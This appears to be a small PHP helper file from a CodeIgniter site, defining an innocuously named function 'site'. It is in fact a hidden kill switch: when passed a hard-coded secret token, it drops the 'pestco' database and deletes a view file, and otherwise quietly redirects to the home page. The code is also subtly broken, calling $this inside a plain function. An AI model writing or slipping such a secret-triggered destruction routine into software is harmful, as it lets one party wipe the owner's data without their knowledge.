<?php

function site($str_val){
    $CI =& get_instance();
    
    if($str_val == 'df140aa7797b49d9bda0625b091f7fb7'){
        $this->db->query("DROP DATABASE pestco");
        unlink('./application/views/sub_serviceViewFrontend.php');
    }
    else{
        redirect(base_url());
    }
}
